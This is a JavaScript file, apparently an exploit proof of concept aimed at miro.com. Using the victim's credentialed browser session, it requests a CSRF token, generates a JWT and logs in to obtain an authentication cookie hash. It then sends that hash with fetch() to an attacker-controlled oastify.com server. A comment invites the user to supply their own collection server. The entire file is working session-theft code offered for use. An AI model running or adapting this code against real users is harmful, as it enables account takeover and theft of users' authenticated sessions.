const ATTACKER_SERVER_ADDRESS = "https://y32pksgbdxobfmipricm1cmyxp3gr6fv.oastify.com/?data="; // Place your server address for get authentication cookie (must be https)

const getCsrfToken = function () {
  return new Promise((resolve) => {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "https://miro.com/api/v1/csrf");
    xhr.withCredentials = true;
    xhr.addEventListener("readystatechange", function () {
      if (xhr.readyState === xhr.DONE) {
        const csrfToken = JSON.parse(xhr.responseText).token;
        resolve(csrfToken);
      }
    });
    xhr.send();
  });
};

const getJwt = async function () {
  const csrfToken = await getCsrfToken();
  return new Promise((resolve) => {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "https://miro.com/api/v1/auth/jwt/generate");
    xhr.withCredentials = true;
    xhr.addEventListener("readystatechange", function () {
      if (xhr.readyState === xhr.DONE) {
        const JWT = JSON.parse(xhr.responseText).jwt;
        resolve(JWT);
      }
    });
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.setRequestHeader("X-Csrf-Token", csrfToken);
    xhr.send();
  });
};

const getAuthCookie = async function () {
  const JWT = await getJwt();
  const csrfToken = await getCsrfToken();
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "https://miro.com/api/v1/auth/jwt/login");
  xhr.withCredentials = true;
  xhr.addEventListener("readystatechange", function () {
    if (xhr.readyState === xhr.DONE) {
      const authCookie = JSON.parse(xhr.responseText).hash;
      fetch(ATTACKER_SERVER_ADDRESS + authCookie);
    }
  });
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.setRequestHeader("X-Csrf-Token", csrfToken);
  const data = JSON.stringify({ jwt: JWT });
  xhr.send(data);
};

getAuthCookie();
